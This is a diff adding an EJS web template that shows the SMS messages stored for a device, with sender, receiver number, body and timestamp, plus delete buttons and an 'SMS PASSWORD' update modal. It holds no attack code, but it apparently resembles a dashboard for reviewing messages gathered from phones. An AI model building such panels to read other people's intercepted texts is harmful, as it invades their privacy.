@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SMS Details</title>
+  <link rel="stylesheet" href="/css/notify.css" />
+</head>
+<body>
+  <div class="button-row">
+    <div class="left-icons">
+      <button class="icon-btn" onclick="location.href='/api/device/dashboard'">
+        <img src="/image/back.png" alt="Back">
+      </button>
+      <button id="delete-btn" class="icon-btn">
+        <img src="/image/delete.png" alt="Delete">
+      </button>
+    </div>
+    <button id="number-btn" class="update-btn">Update</button>
+  </div>
+
+  <div class="container">
+    <% if (smsData.length > 0) { %>
+      <% smsData.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp)).forEach(sms=>{ %>
+        <div class="sms-card">
+          <h3>Sender: <%= sms.sender %></h3>
+          <% if (sms.senderNumber) { %>
+            <p><strong>Sender Number:</strong> <%= sms.senderNumber %></p>
+          <% } %>
+          <p><strong>Receiver Number:</strong> <%= sms.receiverNumber %></p>
+          <p><strong>Title:</strong> <%= sms.title %></p>
+          <p><strong>Body:</strong> <%= sms.body %></p>
+          <p class="timestamp"><strong>Timestamp:</strong> <%= sms.timestamp %></p>
+        </div>
+      <% }) %>
+    <% } else { %>
+      <p class="no-sms">No SMS found for this device.</p>
+    <% } %>
+  </div>
+
+  <!-- Modal -->
+  <div id="updateModal" class="modal">
+    <div class="modal-content">
+      <h2>SMS PASSWORD</h2>
+      <input type="password" placeholder="Enter Password" id="updatePassword" />
+      <button id="modalUpdateBtn">Update</button>
+    </div>
+  </div>
+
+  <script src="/js/update-modal.js"></script>
+    <script src="/js/delete.js"></script>
+</body>
+</html>
+
+
